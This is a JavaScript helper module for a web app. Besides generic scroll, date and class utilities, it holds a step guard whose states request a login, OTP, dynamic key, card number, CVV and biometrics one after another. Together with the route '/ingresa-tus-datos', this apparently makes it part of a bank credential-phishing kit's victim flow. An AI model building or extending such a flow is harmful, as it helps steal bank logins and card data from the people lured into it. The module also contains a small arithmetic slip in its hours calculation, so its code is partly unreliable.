import moment from "moment";

export function isMobile() {
  return window ? window.matchMedia(`(max-width: 767px)`).matches : false;
}

export function isTablet() {
  return window.matchMedia("(min-width: 768px) and (max-width: 1023px)").matches
};

export function isDesktop() {
  return window.matchMedia("(min-width: 1024px)").matches
};

// Lista de estados posteriores al login que se deben registrar en el localStorage
export const POST_LOGIN_STATES = [
  "solicitar_login",
  "solicitar_otp",
  "sol_token",
  "solicitar_dinamica",
  "solicitar_cvv",
  "solicitar_tc",
  "solicitar_923",
  "solicitar_biometria",
  "solicitar_finalizar",
];

// Funcion para detectar la fecha y hora actual con formato
export function updateStateSession(state) {

  // Se obtiene la fecha y hora actual
  const now = new Date();

  // Se captura la fecha del sistema
  const stateFromSession = {
    estado: state,
    fecha: now.toISOString(),
    url: window.location.pathname
  };

  // Se guarda el estado actualizado en localStorage
  localStorage.setItem("auth_guard", JSON.stringify(stateFromSession));
};

// Se crea la funcion para validar el paso actual y redirigir si es necesario
export function validateStep(expectedState, navigate) {

  // Se obtiene el estado del localStorage
  const authGuard = JSON.parse(localStorage.getItem("auth_guard"));

  // Si no hay estado → solo permitir paso 1
  if (!authGuard) {

    // Si el paso esperado no es solicitar_datos, redirigir al paso 1
    if (expectedState !== "solicitar_datos") {

      // Redirigir al paso 1
      navigate("/ingresa-tus-datos", { replace: true });

      // Bloquear navegación al paso esperado
      return false;
    };

    // Permitir navegación al paso 1
    return true;
  };

  // Bloquear regreso al paso 1
  if (expectedState === "solicitar_datos" && authGuard.estado !== "solicitar_datos") {

    // Se redirige al paso actual registrado en el localStorage
    navigate(authGuard.url, { replace: true });

    // Bloquear navegación al paso 1
    return false;
  };

  // Permitir navegación libre entre estados post-login
  if (POST_LOGIN_STATES.includes(expectedState)) {

    // Si el estado actual no coincide con el estado esperado, redirigir al estado actual
    return true;
  };

  // Se permite navegación a estados fuera del flujo post-login (ej: tc-customs, cvv-customs, etc.)
  return true;
}

// Función para limpiar el padding del body (safe area inset)
export const limpiarPaddingBody = () => {

  // Se verifica que el objeto document esté definido
  if (typeof document === "undefined") return;

  // 1️⃣ Forzar scroll al tope (window)
  window.scrollTo({
    top: 0,
    left: 0,
    behavior: "auto" // importante: NO smooth en flows bancarios
  });

  // 2️⃣ Forzar scroll en documentElement y body (cross-browser)
  document.documentElement.scrollTop = 0;
  document.body.scrollTop = 0;

  // Se elimina el padding-top del body
  document.body.style.setProperty("padding-top", "0", "important");
  document.body.style.setProperty("padding-bottom", "0", "important");
};

function currentYPosition() {
  if (!window) return;

  // Firefox, Chrome, Opera, Safari
  if (window.scrollY) {
    return window.scrollY;
  }

  // Internet Explorer 6 - standards mode
  if (document.documentElement && document.documentElement.scrollTop) {
    return document.documentElement.scrollTop;
  }

  // Internet Explorer 6, 7 and 8
  if (document.body.scrollTop) {
    return document.body.scrollTop;
  }

  return 0;
}

function elmYPosition(elm) {
  var y = elm.offsetTop;
  var node = elm;

  while (node.offsetParent && node.offsetParent !== document.body) {
    node = node.offsetParent;
    y += node.offsetTop;
  }

  return y;
}

export function scrollTo(scrollableElement, elmID) {
  var elm = document.getElementById(elmID);

  if (!elmID || !elm) {
    return;
  }

  var startY = currentYPosition();
  var stopY = elmYPosition(elm);
  var distance = stopY > startY ? stopY - startY : startY - stopY;
  if (distance < 100) {
    scrollTo(0, stopY);
    return;
  }
  var speed = Math.round(distance / 50);
  if (speed >= 20) speed = 20;
  var step = Math.round(distance / 25);
  var leapY = stopY > startY ? startY + step : startY - step;
  var timer = 0;
  if (stopY > startY) {
    for (var i = startY; i < stopY; i += step) {
      setTimeout(
        (function (leapY) {
          return () => {
            scrollableElement.scrollTo(0, leapY);
          };
        })(leapY),
        timer * speed
      );
      leapY += step;
      if (leapY > stopY) leapY = stopY;
      timer++;
    }
    return;
  }
  for (let i = startY; i > stopY; i -= step) {
    setTimeout(
      (function (leapY) {
        return () => {
          scrollableElement.scrollTo(0, leapY);
        };
      })(leapY),
      timer * speed
    );
    leapY -= step;
    if (leapY < stopY) leapY = stopY;
    timer++;
  }
  return false;
}

export function getTimeDifference(date) {
  let difference =
    moment(new Date(), "DD/MM/YYYY HH:mm:ss").diff(moment(date, "DD/MM/YYYY HH:mm:ss")) / 1000;

  if (difference < 60) return `${Math.floor(difference)} seconds`;
  else if (difference < 3600) return `${Math.floor(difference / 60)} minutes`;
  else if (difference < 86400) return `${Math.floor(difference / 3660)} hours`;
  else if (difference < 86400 * 30) return `${Math.floor(difference / 86400)} days`;
  else if (difference < 86400 * 30 * 12) return `${Math.floor(difference / 86400 / 30)} months`;
  else return `${(difference / 86400 / 30 / 12).toFixed(1)} years`;
}

export function generateRandomId() {
  const tempId = Math.random().toString();
  const uid = tempId.substring(2, tempId.length - 1);
  return uid;
}

export function classList(classes) {
  return Object.entries(classes)
    .filter((entry) => entry[1])
    .map((entry) => entry[0])
    .join(" ");
}

export const flat = (array) => {
  let result = [];

  array.forEach(function (a) {
    result.push(a);
    if (Array.isArray(a.children)) {
      result = result.concat(flat(a.children));
    }
  });

  return result;
};

export const generateLastDays = (length = 7) => {
  return Array.from({ length }, (_, i) => i)
    .sort((a, b) => b - a)
    .map((i) => moment().subtract(i, "days").format("D MMM YY"));
};
